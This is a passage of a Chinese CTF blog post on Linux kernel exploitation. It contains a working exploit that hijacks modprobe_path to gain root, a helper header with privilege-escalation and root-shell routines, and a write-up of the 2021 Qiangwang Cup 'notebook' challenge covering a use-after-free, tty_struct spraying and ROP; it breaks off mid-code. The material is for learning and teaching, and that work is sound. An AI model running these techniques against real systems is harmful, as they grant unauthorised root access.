kernel_offset=*((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(buf1)+<span class="hljs-number">86</span>)-DO_SAK_WORK;<br>    kernel_base=(<span class="hljs-type">void</span>*)((<span class="hljs-type">size_t</span>)kernel_base+kernel_offset);<br>    FILE* file = fopen(<span class="hljs-string">&quot;/kernel_addr.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!file)<br>        errExit(<span class="hljs-string">&quot;Fail to create kernel_addr.txt!&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(file, <span class="hljs-string">&quot;%llx %llx&quot;</span>, kernel_base, kernel_offset);<br>    fclose(file);<br>    <br>exploit:<br>    modprobe_path=MODPROBE_PATH+kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Kernel offset: 0x%llx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] Kernel base: %p\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] modprobe_path: %p\n&quot;</span>, modprobe_path);<br><br>    <span class="hljs-comment">//hijack modprobe_path</span><br>    chunkAdd(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">memcpy</span>(page,&amp;modprobe_path,<span class="hljs-number">8</span>);<span class="hljs-comment">//object-&gt;next</span><br>    <span class="hljs-comment">//memcpy(((unsigned long long*)(page) + 1), &quot;whatwhat&quot;, 8);</span><br>    <span class="hljs-type">pid_t</span> pid=fork();<br>    <span class="hljs-keyword">if</span> (pid&lt;<span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;Fork child Failed!&quot;</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Chile process sleeping now...&quot;</span>);<br>        sleep(<span class="hljs-number">2</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Chile process started.&quot;</span>);<br>        chunkDel(<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Object free . Backing parent thread...&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Parent process trapped in userfaultfd again...&quot;</span>);<br>        chunkEdit(<span class="hljs-number">0</span>,buf2);<br>    &#125;<br>    <span class="hljs-comment">//hijack the modprobe_path</span><br>    chunkAdd(<span class="hljs-number">0x100</span>);<br>    chunkAdd(<span class="hljs-number">0x100</span>);<br><br>    chunkEdit(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;/getshell&quot;</span>);<br><br>    <span class="hljs-comment">//trigger the modprobe_path</span><br>    system(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;/fake&quot;</span>);<br>    <br>    <span class="hljs-comment">// get flag</span><br>    sleep(<span class="hljs-number">1</span>);<br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;FAILED to hijack!&quot;</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">0x100</span>];<br>    read(fd, flag, <span class="hljs-number">0x100</span>);<br>    write(<span class="hljs-number">1</span>, flag, <span class="hljs-number">0x100</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>但失败概率也很高，整个循环脚本一直测</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>while true<br>do<br>    ./exp<br>done<br></code></pre></td></tr></table></figure><p>以root权限执行恶意文件，给flag文件加chmod 777,另起一个shell</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/6-1684499662255.png" alt="6"></p><p>UserFaultFd可以模板套一下,<code>registerUserFaultFd(addr, len, handler);</code> handler的写法也套一下模板</p><p>这个是arttnba3师傅封装的头文件kernel.h，有一些kernel pwn中常用的结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><br><span class="hljs-type">void</span> * kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> kernel_offset = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">pthread_t</span> monitor_thread;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> * addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span>*))</span><br>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = pthread_create(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-comment">/* ------ kernel structure ------ */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">serial_icounter_struct</span>;</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> * (*<span class="hljs-title">lookup</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>,</span><br><span class="hljs-class">            <span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span>, <span class="hljs-title">int</span> <span class="hljs-title">idx</span>);</span><br>    <span class="hljs-type">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-type">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,<br>              <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);<br>    <span class="hljs-type">int</span>  (*put_char)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ch);<br>    <span class="hljs-type">void</span> (*flush_chars)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*write_room)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*chars_in_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-type">long</span> (*compat_ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-type">void</span> (*set_termios)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> ktermios * old);<br>    <span class="hljs-type">void</span> (*throttle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-type">void</span> (*unthrottle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-type">void</span> (*stop)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*start)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*hangup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span> (*break_ctl)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> state);<br>    <span class="hljs-type">void</span> (*flush_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*set_ldisc)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*wait_until_sent)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> timeout);<br>    <span class="hljs-type">void</span> (*send_xchar)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">char</span> ch);<br>    <span class="hljs-type">int</span> (*tiocmget)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span> (*tiocmset)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">set</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clear);<br>    <span class="hljs-type">int</span> (*resize)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> winsize *ws);<br>    <span class="hljs-type">int</span> (*set_termiox)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> termiox *tnew);<br>    <span class="hljs-type">int</span> (*get_icount)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                <span class="hljs-keyword">struct</span> serial_icounter_struct *icount);<br>    <span class="hljs-type">void</span> (*show_fdinfo)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> seq_file *m);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span><br>    <span class="hljs-type">int</span> (*poll_init)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> *options);<br>    <span class="hljs-type">int</span> (*poll_get_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line);<br>    <span class="hljs-type">void</span> (*poll_put_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> ch);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> *<span class="hljs-title">proc_fops</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="2021强网杯notebook">2021强网杯notebook</h3><h4 id="0x01分析-2">0x01分析</h4><h5 id="1-保护-2">1.保护</h5><p>开启了kaslr，smep/smap  (smep用户代码不可执行、smap用户数据不可访问)</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/1-1684500912095.png" alt="1"></p><p>开启了KPTI(Kernel page-table isolation内核页表隔离)</p><p><code>cat /sys/devices/system/cpu/vulnerabilities/*</code></p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2-1684500912096.png" alt="2"></p><h5 id="2-notebook-ko">2.notebook.ko</h5><p>惯例看漏洞驱动</p><h6 id="一-ioctl">一.ioctl</h6><p>菜单选项,add,gift,del,edit</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/3-1684500912096.png" alt="3"></p><p>add向slub申请不大于0x60的object，</p><p>有个copy_from_user拷贝用户数据到内核全局变量name,而这个name仅用作于打印，可以认为出题人放在这里是给我们userfaultfd的，虽然加了读锁，不过读锁是可以并发的</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/4-1684500912095.png" alt="4"></p><p>del加了写锁，也就是独占锁（可以用edit的krealloc来达到kfree的作用，edit里没有写锁）</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/5-1684500912096.png" alt="5"></p><p>edit用krealloc来改变object的大小，这里edit的newsize没有限制，可以任意大小</p><p><strong>krealloc的特性：</strong></p><blockquote><p>krealloc的new_size=NULL，则kfree释放object</p><p>krealloc的new_size&lt;ks，则指针不变，仅调整kasan监控的区域</p><p>krealloc的new_size&gt;ks,则kfree释放原本object,kmalloc重新申请新object</p></blockquote><p>这里也有个多余的copy_from_user到name</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/6-1684500912096.png" alt="6"></p><p>gift把申请object的地址传给用户</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/7-1684500912096.png" alt="7"></p><h6 id="二-read-write">二.read&amp;write</h6><p>两者都用了<code>_check_object_size</code>来检查size,防止了溢出</p><p>read就是读object指定size字节给用户</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/8-1684500912096.png" alt="8"></p><p>write就是从用户地址指定size字节给object</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/9-1684500912096.png" alt="9"></p><h4 id="0x02解法1：-2">0x02解法1：</h4><p>1.由add和edit配合申请0x10个TTY_STRUCT_SIZE(0x2e0)的object,然后都去edit一个更大的size，借由krealloc的特性以达到kfree，</p><p>然后在下面copy_from_user用的是注册userfaultfd的buf,都使其暂停，达到了uaf的效果</p><p>2.进行heap spray,多次重复打开/dev/ptmx，以求大概率分配某个释放的object为 tty_struct</p><blockquote><p>此外在 read 和 write 中都会用 <code>_check_object_size</code> 检查 size 与 buf 大小是否匹配，在 mynote_add 当中限制了 size 应当不大于 0x60，而我们在 edit 中的释放操作之前会将 size 改掉，考虑到在 mynote_add 中先用 copy_from_user 拷贝数据后才调用 kmalloc，故这里还是可以新开 add 线程让 size 合法后通过 userfaultfd 让其卡在这里</p></blockquote><p>3.借由gift给的地址，检查magic是否为0x5401来判断是否分配到tty_struct</p><p>4.通过tty结构中的 tty_operations泄露内核地址</p><blockquote><p><strong>ptm_unix98_ops &amp;&amp; pty_unix98_ops</strong></p><p>在 ptmx 被打开时内核通过 <code>alloc_tty_struct()</code> 分配 tty_struct 的内存空间，之后会将 tty_operations 初始化为<strong>全局变量</strong> <code>ptm_unix98_ops</code> 或 <code>pty_unix98_ops</code>，在调试阶段我们可以先关掉 kaslr 开 root 从 <code>/proc/kallsyms</code> 中读取其偏移</p><p>开启了 kaslr 的内核在内存中的偏移依然以内存页为粒度，故我们可以通过比对 tty_operations 地址的低三16进制位来判断是 ptm_unix98_ops 还是 pty_unix98_ops</p></blockquote><p>5.劫持tty_ops的write，通过程序运行那时rdi寄存器存的tty_struct地址，找gadget三次栈迁移</p><blockquote><p>从tty_ops-&gt;write到tty_struct到tty_ops到notes</p></blockquote><p>在notes写入rop链，用<code>commit_creds(init_cred)</code>即可，返回用户态用<code>swapgs_restore_regs_and_return_to_usermode</code>，顺便把KPTI过了</p><p>（其实我感觉只要两次栈迁移即可，直接tty_struct到notes，但是我尝试多次无果）</p><p>5.最后遍历write某个分配到tty_struct的设备来触发即可</p><h5 id="Exp">Exp</h5><p>因为已经懒得一步步写了，总之就是在理解的基础上(自认为)各种cv</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span 